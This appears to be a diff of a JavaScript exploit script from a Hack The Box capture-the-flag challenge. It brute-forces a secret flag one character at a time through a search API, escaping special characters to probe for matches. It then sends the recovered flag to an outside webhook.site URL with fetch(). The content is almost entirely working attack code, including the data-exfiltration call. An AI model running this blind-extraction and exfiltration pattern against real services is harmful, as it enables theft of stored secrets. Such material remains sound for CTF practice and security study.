@@ -3,7 +3,7 @@
 var ip = '127.0.0.1:1337';
 var ip2 = '138.68.155.111:32539';
 var hook = 'webhook.site/05b5e88e-174d-4bd4-b754-6533413c5cb8';
-var flag = 'HTB{5w33t__ali3ndr3n__';
+var flag = 'HTB{5w33t_ali3ndr3n_';
 var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
 var special = '_%\"\'';
 var url1 = `http://${ip}/api/entries/search?q=`
@@ -20,7 +20,7 @@ async function getFlag(chars) {
  var b = false; var char;
  for(var i=0; i < chars.length; i++){
  char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
- await getPartialFlag(char).then((res) => {flag=flag.concat(char); b = res==='}' ? true:false; i=0} , (res)=> { } );
+ await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
  if(b) break;}
  fetch(`https://${hook}/flag=${flag}`);
 };
